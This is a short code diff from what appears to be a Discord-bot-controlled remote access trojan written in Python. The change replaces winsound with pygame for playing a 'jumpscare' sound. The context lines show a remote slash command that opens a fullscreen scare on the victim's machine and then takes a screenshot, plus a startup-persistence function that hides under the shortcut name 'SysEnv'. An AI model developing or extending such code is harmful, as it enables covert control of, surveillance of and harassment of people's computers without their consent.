@@ -32,7 +32,7 @@ from typing import Optional
 import win32com.client
 from pathlib import Path
 import socket as st1
-import winsound
+import pygame
 import tkinter as tk
 
 
@@ -73,6 +73,11 @@ def show_fullscreen_jumpscare():
     root.after(1000, root.destroy)
 
     root.mainloop()
+
+def play_sound():
+    pygame.mixer.init()
+    pygame.mixer.music.load("jumpscare/jumpscare.mp3")
+    pygame.mixer.music.play()
 
 def add_to_startup(script_path=os.path.join(target_path, 'skibidi-startup', 'startup.pyw'), shortcut_name="SysEnv"):
 
@@ -792,7 +797,7 @@ async def jumpscare(interaction: nextcord.Interaction):
         show_fullscreen_jumpscare()
         print("Jumpscare image opened")
         print("Playing jumpscare sound...")
-        winsound.PlaySound("jumpscare/jumpscare.wav", winsound.SND_FILENAME | winsound.SND_ASYNC)
+        play_sound()
         print("Taking screenshot...")
         await interaction.edit_original_message(content="Jumpscare activated!, taking screenshot...")
 
